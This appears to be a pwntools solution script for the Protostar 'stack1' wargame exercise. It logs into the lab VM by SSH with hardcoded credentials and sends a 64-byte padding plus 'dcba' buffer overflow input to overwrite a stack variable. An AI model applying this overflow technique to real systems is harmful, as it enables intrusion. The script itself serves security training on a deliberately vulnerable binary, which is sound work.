from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")

exploit = "A"*64 + "dcba"
sh.sendline("./stack1 %s" % exploit)

print(sh.recvline())